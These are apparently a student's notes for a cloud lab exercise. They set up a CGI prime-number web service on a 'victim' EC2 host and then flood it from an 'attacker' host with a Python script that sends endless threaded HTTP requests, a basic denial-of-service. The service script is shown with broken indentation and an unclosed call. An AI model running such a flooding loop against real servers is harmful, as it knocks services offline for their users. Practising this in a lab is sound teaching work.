# Laborator 3

Connect to victim : 

```bash
ssh -i "qwikLABS-L1065-1930304.pem" ec2-user@34.242.251.191
```

Connect to attacker:

```bash
ssh -i "qwikLABS-L1065-1930304.pem" ec2-user@54.194.158.79
```

Start a server on the victim :

~/server/cgi-bin/service.py will be an executable script that gets invoked every time our server process
receives an HTTP request:
o create folder tree and cd into the folder that will hold our script

```cmd
$ mkdir -p ~/service/cgi-bin; cd ~/service/cgi-bin
```

```py
#!/usr/bin/env python
print('Content-type: text/html\n')
print('<title>Hello World</title>')
for num in range(2, 5000):
 prime = True
 for i in range(2, num):
 if (num%i == 0):
 prime = False
 if prime:
 print(num
 ```

 Give permissions to run, and start server:

 ```cmd
chmod +x service.py

cd ~/server; python -m CGIHTTPServer 1025
 ```

Open TCP connection and make call with wget:

```
wget http://localhost:1025/cgi-bin/service.py -O response; cat response | head -n 5
```

Python script to overload : 

```python
import requests
from multiprocessing.dummy import Pool as ThreadPool

def get(n):
    return (requests.get("http://34.242.251.191:1025/cgi-bin/service.py"))

pool = ThreadPool(4)

while 1 > 0:
 results = pool.map(get,[1,2,3])

```